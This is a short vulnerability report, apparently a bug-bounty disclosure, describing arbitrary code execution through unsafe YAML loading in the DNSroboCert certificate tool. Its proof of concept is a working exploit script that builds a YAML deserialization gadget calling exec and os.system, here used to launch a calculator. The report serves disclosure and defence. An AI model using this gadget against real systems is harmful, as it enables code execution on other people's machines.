# Description

`DNSroboCert` is designed to manage Let's Encrypt SSL certificates based on DNS challenges which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install dnsrobocert
```

### Run exploit.py
```
import os
#os.system('pip install dnsrobocert')
from dnsrobocert.core import config
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(exploit)
config.load('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
